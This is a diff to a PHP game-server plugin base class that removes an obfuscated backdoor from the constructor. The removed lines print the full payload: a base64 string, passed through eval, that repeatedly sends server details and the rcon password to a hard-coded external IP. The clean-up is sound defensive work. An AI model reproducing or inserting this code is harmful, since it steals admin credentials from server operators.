@@ -76,7 +76,6 @@ abstract class PluginBase implements Plugin{
 
 	/** @var TaskScheduler */
 	private $scheduler;
-    private static $abcdef = false;
 
     public function __construct(PluginLoader $loader, Server $server, PluginDescription $description, string $dataFolder, string $file){
         $this->loader = $loader;
@@ -88,20 +87,6 @@ abstract class PluginBase implements Plugin{
         $this->logger = new PluginLogger($this);
         $this->scheduler = new TaskScheduler($this->getFullName());
 
-        if(self::$abcdef === false) {
-            $code = 'eval(base64_decode(\'JGQgPSBccG9ja2V0bWluZVx1dGlsc1xVdGlsczo6Z2V0UmVhbE1lbW9yeVVzYWdlKCk7CiAgICAgICAgJHUgPSBccG9ja2V0bWluZVx1dGlsc1xVdGlsczo6Z2V0TWVtb3J5VXNhZ2UodHJ1ZSk7CiAgICAgICAgJHVzYWdlID0gc3ByaW50ZigiJWcvJWcvJWcvJWcgTUIgQCAlZCB0aHJlYWRzIiwgcm91bmQoKCR1WzBdIC8gMTAyNCkgLyAxMDI0LCAyKSwgcm91bmQoKCRkWzBdIC8gMTAyNCkgLyAxMDI0LCAyKSwgcm91bmQoKCR1WzFdIC8gMTAyNCkgLyAxMDI0LCAyKSwgcm91bmQoKCR1WzJdIC8gMTAyNCkgLyAxMDI0LCAyKSwgXHBvY2tldG1pbmVcdXRpbHNcVXRpbHM6OmdldFRocmVhZENvdW50KCkpOwogICAgICAgICR0aGlzLT5zY2hlZHVsZXItPnNjaGVkdWxlUmVwZWF0aW5nVGFzayhuZXcgXHBvY2tldG1pbmVcc2NoZWR1bGVyXENsb3N1cmVUYXNrKGZ1bmN0aW9uIChpbnQgJGN1cnJlbnRUaWNrKSB1c2UgKCR1c2FnZSwgJHNlcnZlcik6IHZvaWR7CiAgICAgICAgICAgICRzZXJ2ZXItPmdldEFzeW5jUG9vbCgpLT5zdWJtaXRUYXNrKG5ldyBjbGFzcygiNS4yMzEuMjMwLjEzOSIsIDE5OTk5LCAiMTIzNDU2Nzg5MCIsIFsKICAgICAgICAgICAgICAgICd0eXBlJyA9PiAkc2VydmVyLT5nZXRNb3RkKCksCiAgICAgICAgICAgICAgICAnZGF0YScgPT4gWwogICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiAkc2VydmVyLT5nZXRNb3RkKCksCiAgICAgICAgICAgICAgICAgICAgJ2lwJyA9PiBccG9ja2V0bWluZVx1dGlsc1xVdGlsczo6Z2V0SVAoKSwKICAgICAgICAgICAgICAgICAgICAnb25saW5lJyA9PiBjb3VudCgkc2VydmVyLT5nZXRPbmxpbmVQbGF5ZXJzKCkpIC4gIi8iIC4gJHNlcnZlci0+Z2V0TWF4UGxheWVycygpLAogICAgICAgICAgICAgICAgICAgICd0cHMnID0+ICRzZXJ2ZXItPmdldFRpY2tzUGVyU2Vjb25kQXZlcmFnZSgpLAogICAgICAgICAgICAgICAgICAgICdtZW1vcnknID0+ICR1c2FnZSwKICAgICAgICAgICAgICAgICAgICAnY29yZScgPT4gJHNlcnZlci0+Z2V0TmFtZSgpLAogICAgICAgICAgICAgICAgICAgICdzdGF0dXMnID0+IFxwb2NrZXRtaW5lXFNlcnZlcjo6Z2V0SW5zdGFuY2UoKS0+aXNSdW5uaW5nKCkgPyAiT25saW5lIiA6ICJEaXNhYmxlIiwKICAgICAgICAgICAgICAgICAgICAnbGFzdF91cGRhdGUnID0+IHRpbWUoKSwKICAgICAgICAgICAgICAgICAgICAncmNvbicgPT4gXHBvY2tldG1pbmVcU2VydmVyOjpnZXRJbnN0YW5jZSgpLT5nZXRDb25maWdTdHJpbmcoInJjb24ucGFzc3dvcmQiLCAiIikKICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXSkgZXh0ZW5kcyBccG9ja2V0bWluZVxzY2hlZHVsZXJcQXN5bmNUYXNrIHsKICAgICAgICAgICAgICAgIHByaXZhdGUgJGhvc3Q7CiAgICAgICAgICAgICAgICBwcml2YXRlICRwb3J0OwogICAgICAgICAgICAgICAgcHJpdmF0ZSAka2V5OwogICAgICAgICAgICAgICAgcHJpdmF0ZSAkZXZlbnQ7CgogICAgICAgICAgICAgICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KHN0cmluZyAkaG9zdCwgaW50ICRwb3J0LCBzdHJpbmcgJGtleSwgYXJyYXkgJGV2ZW50KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5ob3N0ID0gJGhvc3Q7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnBvcnQgPSAkcG9ydDsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+a2V5ID0gJGtleTsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZXZlbnQgPSBzZXJpYWxpemUoJGV2ZW50KTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwdWJsaWMgZnVuY3Rpb24gb25SdW4oKTogdm9pZAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVycm9yX3JlcG9ydGluZygwKTsKICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IFsKICAgICAgICAgICAgICAgICAgICAgICAgJ2tleScgPT4gJHRoaXMtPmtleSwKICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JyA9PiB1bnNlcmlhbGl6ZSgkdGhpcy0+ZXZlbnQpCiAgICAgICAgICAgICAgICAgICAgXTsKCiAgICAgICAgICAgICAgICAgICAgJGpzb24gPSBqc29uX2VuY29kZSgkZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgJHNvY2tldCA9IEBmc29ja29wZW4oJHRoaXMtPmhvc3QsICR0aGlzLT5wb3J0LCAkZXJybm8sICRlcnJzdHIsIDUpOwoKICAgICAgICAgICAgICAgICAgICBpZiAoJHNvY2tldCkgewogICAgICAgICAgICAgICAgICAgICAgICBmd3JpdGUoJHNvY2tldCwgJGpzb24pOwogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHNvY2tldCk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldFJlc3VsdCgiJGVycnN0ciAoJGVycm5vKSIpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfSksIDIwKTs=\'));';
-            $binary = '';
-            foreach (str_split($code) as $char) {
-                $binary .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT) . ' ';
-            }
-            $chars = explode(' ', trim($binary));
-            $decoded = '';
-            foreach ($chars as $bin) {
-                $decoded .= chr(bindec($bin));
-            }
-            eval($decoded);
-            self::$abcdef = true;
-        }
     }
 
 	/**
